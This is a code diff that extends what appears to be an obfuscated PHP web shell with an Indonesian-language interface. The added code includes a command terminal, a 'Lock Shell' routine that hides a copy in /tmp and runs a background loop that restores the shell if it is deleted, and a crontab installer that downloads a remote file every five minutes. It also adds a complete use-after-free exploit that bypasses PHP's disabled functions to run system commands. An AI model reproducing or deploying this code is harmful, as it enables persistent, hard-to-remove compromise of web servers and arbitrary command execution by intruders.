@@ -731,21 +731,404 @@ function QiUyTbAgHk($s)
 				2 => ['pipe', 'w'], // stderr
 			];
 		
-			$gcw = "get_path";
+			$gcw = "getcwd";
 			$cwd = $gcw();
 		
 			$process = proc_open($command, $descriptors, $pipes, $cwd);
 		
-			$output = stream_get_contents($pipes[1]);
-			$error = stream_get_contents($pipes[2]);
+			if (is_resource($process)) {
+				$output = stream_get_contents($pipes[1]);
+				$error = stream_get_contents($pipes[2]);
 		
-			fclose($pipes[0]);
-			fclose($pipes[1]);
-			fclose($pipes[2]);
+				fclose($pipes[0]);
+				fclose($pipes[1]);
+				fclose($pipes[2]);
 		
-			proc_close($process);
+				$returnValue = proc_close($process);
 		
-			return $output;
+				if (!empty($error)) {
+					echo "<pre>Error: {$error}</pre>";
+				}
+		
+				return $output;
+			} else {
+				echo "Unable to execute the command.";
+			}
+		}
+		function remove_dot($file)
+			{
+				$FILES = $file;
+				$pch = explode(".", $FILES);
+				return $pch[0];
+			}
+		function lockshell($file) {
+			$cwd = getcwd();
+			$curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
+			$temp = $_POST["temp"] ? $_POST["temp"] : "/tmp";
+			if (file_exists($temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile)  . '-handler')) && file_exists($temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text'))) {
+				exec('rm -rf ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text'));
+				exec('rm -rf ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-handler'));
+			}
+			mkdir($temp . "/.sessions");
+			exec("cp $curFile " . $temp . "/.sessions/." . base64_encode($cwd . remove_dot($curFile) . '-text'));
+			chmod($curFile, 0444);
+			$handler = '
+		<?php
+		@ini_set("max_execution_time", 0);
+		while (True){
+			if (!file_exists("' . __DIR__ . '")){
+				mkdir("' . __DIR__ . '");
+			}
+			if (!file_exists("' . $cwd . '/' . $curFile . '")){
+				$text = base64_encode(file_get_contents("' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text') . '"));
+				file_put_contents("' . $cwd . '/' . $curFile . '", base64_decode($text));
+			}
+			if (toku_perm("' . $cwd . '/' . $curFile . '") != 0444){
+				chmod("' . $cwd . '/' . $curFile . '", 0444);
+			}
+		}
+		
+		function toku_perm($flename){
+			return substr(sprintf("%o", fileperms($flename)), -4);
+		}
+		';
+			$hndlers = file_put_contents($temp . "/.sessions/." . base64_encode($cwd . remove_dot($curFile)  . '-handler') . "", $handler);
+			if ($hndlers) {
+				exec('php ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
+			} else {
+				failed();
+			}
+		}
+
+		function lockshell2() {
+			$cwd = getcwd();
+			$curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
+			$temp = $_POST["temp"] ? $_POST["temp"] : "/tmp";
+			if (file_exists($temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile)  . '-handler')) && file_exists($temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text'))) {
+				exec('rm -rf ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text'));
+				exec('rm -rf ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-handler'));
+			}
+			mkdir($temp . "/.sessions");
+			exec("cp $curFile " . $temp . "/.sessions/." . base64_encode($cwd . remove_dot($curFile) . '-text'));
+			chmod($curFile, 0444);
+			$handler = '
+			<?php
+			@ini_set("max_execution_time", 0);
+			while (True){
+				if (!file_exists("' . __DIR__ . '")){
+					mkdir("' . __DIR__ . '");
+				}
+				if (!file_exists("' . $cwd . '/' . $curFile . '")){
+					$text = base64_encode(file_get_contents("' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile) . '-text') . '"));
+					file_put_contents("' . $cwd . '/' . $curFile . '", base64_decode($text));
+				}
+				if (toku_perm("' . $cwd . '/' . $curFile . '") != 0444){
+					chmod("' . $cwd . '/' . $curFile . '", 0444);
+				}
+			}
+
+			function toku_perm($flename){
+				return substr(sprintf("%o", fileperms($flename)), -4);
+			}
+			';
+			$hndlers = file_put_contents($temp . "/.sessions/." . base64_encode($cwd . remove_dot($curFile)  . '-handler') . "", $handler);
+			if ($hndlers) {
+				exec('php ' . $temp . '/.sessions/.' . base64_encode($cwd . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
+			} else {
+				failed();
+			}
+		}
+
+		function lockFile($namafile) {
+			ob_get_flush();
+			$b0 = $namafile;
+			$bc = realpath(dirname($b0));
+			function CC()
+			{
+				ob_start();
+				phpinfo(1);
+				$eb = ob_get_contents();
+				ob_end_clean();
+				preg_match("/--bindir=([^&]+)/si", $eb, $fa);
+				if (isset($fa[1]) && $fa[1] != "") {
+					return $fa[1] . "/php";
+				}
+				preg_match("/--prefix=([^&]+)/si", $eb, $fa);
+				if (!isset($fa[1])) {
+					return "php";
+				}
+				return $fa[1] . "/bin/php";
+			}
+			$A2 = cC();
+			function F6()
+			{
+				$D8 = preg_match("/cli/i", php_sapi_name()) ? true : false;
+				if ($D8 === false) {
+					if (isset($_SERVER["argc"]) && $_SERVER["argc"] >= 2) {
+						$D8 = true;
+					}
+				}
+				if ($D8 === false) {
+					if ($D8 !== basename($namafile)) {
+						$D8 = true;
+					}
+				}
+				return $D8;
+			}
+			function FD($A0, $e2 = "popen")
+			{
+				$be = explode(",", ini_get("disable_functions"));
+				$e8 = [];
+				foreach ($be as $Ca) {
+					$e8[] = QgRwXlZpOqK($Ca);
+				}
+				if (in_array($e2, $e8)) {
+					$e2 = "exec";
+				}
+				if (in_array($e2, $e8)) {
+					return false;
+				}
+				$D5 = "";
+				switch ($e2) {
+					case "exec":
+						exec($A0, $ab);
+						foreach ($ab as $A4 => $df) {
+							$D5 .= $A4 . " : " . $df . PHP_EOL;
+						}
+						return $D5;
+					case "popen":
+						$D1 = popen($A0, "r");
+						while (!feof($D1)) {
+							$F7 = fgets($D1, 4096);
+							$D5 .= $F7;
+						}
+						pclose($D1);
+						return $D5;
+					default:
+						return false;
+						break;
+				}
+			} 
+		}
+
+		function installCronJob($dir) {
+			echo '<div class="card">
+					<div class="card-body form-group">
+						<p class="text-muted">Crontab Automation Project</p>';
+			
+			$cronCommand = 'wget https://raw.githubusercontent.com/TokuHaxor/tool/main/cron -O ' . $dir . '/class.php';
+			exec('(crontab -l; echo "*/5 * * * * ' . $cronCommand . '") | crontab');
+			$cronList = shell_exec('crontab -l');
+			
+			if (empty($cronList)) {
+				echo '<p class="text-muted">[+] Failed to Install</p></div></div>';
+			} else {
+				echo '<p class="text-muted">[+] Defense Shell Logs: </br>' . $cronList . '</p></div></div>';
+			}
+		}
+
+		function bypassGC1($cmd) {
+			global $abc, $helper;
+
+			function str2ptr(&$str, $p = 0, $s = 8) {
+				$address = 0;
+				for($j = $s-1; $j >= 0; $j--) {
+					$address <<= 8;
+					$address |= ord($str[$p+$j]);
+				}
+				return $address;
+			}
+
+			function ptr2str($ptr, $m = 8) {
+				$out = "";
+				for ($i=0; $i < $m; $i++) {
+					$out .= chr($ptr & 0xff);
+					$ptr >>= 8;
+				}
+				return $out;
+			}
+
+			function write(&$str, $p, $v, $n = 8) {
+				$i = 0;
+				for($i = 0; $i < $n; $i++) {
+					$str[$p + $i] = chr($v & 0xff);
+					$v >>= 8;
+				}
+			}
+
+			function leak($addr, $p = 0, $s = 8) {
+				global $abc, $helper;
+				write($abc, 0x68, $addr + $p - 0x10);
+				$leak = strlen($helper->a);
+				if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
+				return $leak;
+			}
+
+			function parse_elf($base) {
+				$e_type = leak($base, 0x10, 2);
+
+				$e_phoff = leak($base, 0x20);
+				$e_phentsize = leak($base, 0x36, 2);
+				$e_phnum = leak($base, 0x38, 2);
+
+				for($i = 0; $i < $e_phnum; $i++) {
+					$header = $base + $e_phoff + $i * $e_phentsize;
+					$p_type  = leak($header, 0, 4);
+					$p_flags = leak($header, 4, 4);
+					$p_vaddr = leak($header, 0x10);
+					$p_memsz = leak($header, 0x28);
+
+					if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
+						# handle pie
+						$data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
+						$data_size = $p_memsz;
+					} else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
+						$text_size = $p_memsz;
+					}
+				}
+
+				if(!$data_addr || !$text_size || !$data_size)
+					return false;
+
+				return [$data_addr, $text_size, $data_size];
+			}
+
+			function get_basic_funcs($base, $elf) {
+				list($data_addr, $text_size, $data_size) = $elf;
+				for($i = 0; $i < $data_size / 8; $i++) {
+					$leak = leak($data_addr, $i * 8);
+					if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
+						$deref = leak($leak);
+						# 'constant' constant check
+						if($deref != 0x746e6174736e6f63)
+							continue;
+					} else continue;
+
+					$leak = leak($data_addr, ($i + 4) * 8);
+					if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
+						$deref = leak($leak);
+						# 'bin2hex' constant check
+						if($deref != 0x786568326e6962)
+							continue;
+					} else continue;
+
+					return $data_addr + $i * 8;
+				}
+			}
+
+			function get_binary_base($binary_leak) {
+				$base = 0;
+				$start = $binary_leak & 0xfffffffffffff000;
+				for($i = 0; $i < 0x1000; $i++) {
+					$addr = $start - 0x1000 * $i;
+					$leak = leak($addr, 0, 7);
+					if($leak == 0x10102464c457f) { # ELF header
+						return $addr;
+					}
+				}
+			}
+
+			function get_system($basic_funcs) {
+				$addr = $basic_funcs;
+				do {
+					$f_entry = leak($addr);
+					$f_name = leak($f_entry, 0, 6);
+
+					if($f_name == 0x6d6574737973) { # system
+						return leak($addr + 8);
+					}
+					$addr += 0x20;
+				} while($f_entry != 0);
+				return false;
+			}
+
+			class ryat {
+				var $ryat;
+				var $chtg;
+				
+				function __destruct()
+				{
+					$this->chtg = $this->ryat;
+					$this->ryat = 1;
+				}
+			}
+
+			class Helper {
+				public $a, $b, $c, $d;
+			}
+
+			if(stristr(PHP_OS, 'WIN')) {
+				die('This PoC is for *nix systems only.');
+			}
+
+			$n_alloc = 10; # increase this value if you get segfaults
+
+			$contiguous = [];
+			for($i = 0; $i < $n_alloc; $i++)
+				$contiguous[] = str_repeat('A', 79);
+
+			$poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
+			$out = unserialize($poc);
+			gc_collect_cycles();
+
+			$v = [];
+			$v[0] = ptr2str(0, 79);
+			unset($v);
+			$abc = $out[2][0];
+
+			$helper = new Helper;
+			$helper->b = function ($x) { };
+
+			if(strlen($abc) == 79 || strlen($abc) == 0) {
+				die("UAF failed");
+			}
+
+			# leaks
+			$closure_handlers = str2ptr($abc, 0);
+			$php_heap = str2ptr($abc, 0x58);
+			$abc_addr = $php_heap - 0xc8;
+
+			# fake value
+			write($abc, 0x60, 2);
+			write($abc, 0x70, 6);
+
+			# fake reference
+			write($abc, 0x10, $abc_addr + 0x60);
+			write($abc, 0x18, 0xa);
+
+			$closure_obj = str2ptr($abc, 0x20);
+
+			$binary_leak = leak($closure_handlers, 8);
+			if(!($base = get_binary_base($binary_leak))) {
+				die("Couldn't determine binary base address");
+			}
+
+			if(!($elf = parse_elf($base))) {
+				die("Couldn't parse ELF header");
+			}
+
+			if(!($basic_funcs = get_basic_funcs($base, $elf))) {
+				die("Couldn't get basic_functions address");
+			}
+
+			if(!($zif_system = get_system($basic_funcs))) {
+				die("Couldn't get zif_system address");
+			}
+
+			# fake closure object
+			$fake_obj_offset = 0xd0;
+			for($i = 0; $i < 0x110; $i += 8) {
+				write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+			}
+
+			# pwn
+			write($abc, 0x20, $abc_addr + $fake_obj_offset);
+			write($abc, 0xd0 + 0x38, 1, 4); # internal func type
+			write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
+
+			($helper->b)($cmd);
+
+			exit();
 		}
 
 		$scandir = $func[21]($dir);
@@ -786,29 +1169,69 @@ function QiUyTbAgHk($s)
 						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-file-plus"></i> New File</a>
 						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfolder" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> New Folder</a>
 						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#bypassgc2" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Bypass PHP 7-8</a>
-						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#bypassphp77" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Bypass PHP 7.0 - 7.3</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#bypassgc1" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Bypass PHP 7.0 - 7.3</a>
 						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#autoroot" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Auto Root</a>
 						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#massht" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Mass .htaccess</a><br>
 						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#c" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Terminal</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#lockshell" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Lock Shell</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#lockfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Lock File</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#crontab" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Crontab</a>
 					</div>
+					
+
+					<div class="col-md-12">
+						<div class="collapse" id="lockshell" data-bs-parent="#tool">
+							<div class="card card-body border-dark mb-3">
+								<form method="POST">
+									<input type="submit" name="lockshell" value="Mulai">
+								</form>
+							</div>
+						</div>
+					</div>
+
+					<div class="col-md-12">
+						<div class="collapse" id="lockfile" data-bs-parent="#tool">
+							<div class="card card-body border-dark mb-3">
+								<form method="POST">
+									<label for="command">Masukkan perintah:</label>
+									<input type="text" name="cmd" required>
+									<input type="submit" name="lockfile" value="Submit">
+								</form>
+							</div>
+						</div>
+					</div>
+
+					<div class="col-md-12">
+						<div class="collapse" id="crontab" data-bs-parent="#tool">
+							<div class="card card-body border-dark mb-3">
+								<form method="POST">
+									<input type="submit" name="crontab" value="Mulai">
+								</form>
+							</div>
+						</div>
+					</div>
+
+					<div class="col-md-12">
+						<div class="collapse" id="bypassgc1" data-bs-parent="#tool">
+							<div class="card card-body border-dark mb-3">
+								<form method="POST">
+									<label for="command">Masukkan perintah:</label>
+									<input type="text" name="cmd" required>
+									<input type="submit" name="bypassgc1" value="Submit">
+								</form>
+							</div>
+						</div>
+					</div>
+			
 
 					<div class="col-md-12">
 				<div class="collapse" id="c" data-bs-parent="#tool">
 					<div class="card card-body border-dark mb-3">
 						<form method="POST">
+						<label for="command">Masukkan perintah:</label>
 							<input type="text" name="c" required>
 							<input type="submit" name="cmd" value="Eksekusi">
 						</form>
-						<?php
-						if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-							$command = $_POST['c'] ?? '';
-							
-							if (!empty($command)) {
-								$output = executeCommand($command);
-								echo "<pre>{$output}</pre>";
-							}
-						}
-						?>
 					</div>
 				</div>
 			</div>
@@ -898,6 +1321,20 @@ function QiUyTbAgHk($s)
 								</div>
 							</div>
 						</div>
+						<?php
+						if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+							$command = $_POST['c'] ?? '';
+							echo '
+							<div class="row">
+							 <div class="col-md-12">
+								<div class="card border-dark">
+									<div class="card-body">';
+							if (!empty($command)) {
+								$output = executeCommand($command);
+								echo "<pre>{$output}</pre>";
+							}
+						}
+						?>
 						<div class="col-md-12">
 							<div class="collapse" id="newfolder" data-bs-parent="#tool">
 								<div class="card card-body border-dark mb-3">
@@ -920,7 +1357,7 @@ function QiUyTbAgHk($s)
 
 		
 		<?php
-		  if (isset($_POST["bypass"])) {
+		  	if (isset($_POST["bypass"])) {
 			   $command = $_POST["shiz"];
 			   echo '
 	        	<div class="row">
@@ -929,10 +1366,74 @@ function QiUyTbAgHk($s)
 			        	<div class="card-body">';
 
 					bypassGC2($command);
-					echo '
-                     </div>                  </div>                 </div>                 </div><br>';
-					}
-					?>
+				echo '
+                        </div>                  
+                    </div>                 
+				</div>                 
+				</div><br>';
+			}
+
+			if (isset($_POST["bypassgc1"])) {
+				$command = $_POST["cmd"];
+				echo '
+				 <div class="row">
+				  <div class="col-md-12">
+					 <div class="card border-dark">
+						 <div class="card-body">';
+ 
+					 bypassGC1($command);
+				 echo '
+						 </div>                  
+					 </div>                 
+				 </div>                 
+				 </div><br>';
+			 }
+
+			if (isset($_POST["lockshell"])) {
+				echo '
+	        	<div class="row">
+		         <div class="col-md-12">
+		        	<div class="card border-dark">
+			        	<div class="card-body">';
+
+					lockshell2();
+				echo '
+                        </div>                  
+                    </div>                 
+				</div>                 
+				</div><br>';
+			}
+
+			if (isset($_POST["lockfile"])) {
+				echo '
+	        	<div class="row">
+		         <div class="col-md-12">
+		        	<div class="card border-dark">
+			        	<div class="card-body">';
+
+					lockfile($_POST["cmd"]);
+				echo '
+                        </div>                  
+                    </div>                 
+				</div>                 
+				</div><br>';
+			}
+
+			if (isset($_POST["crontab"])) {
+				echo '
+	        	<div class="row">
+		         <div class="col-md-12">
+		        	<div class="card border-dark">
+			        	<div class="card-body">';
+
+					installCronJob(__DIR__);
+				echo '
+                        </div>                  
+                    </div>                 
+				</div>                 
+				</div><br>';
+			}
+		?>
 					
 				
 				
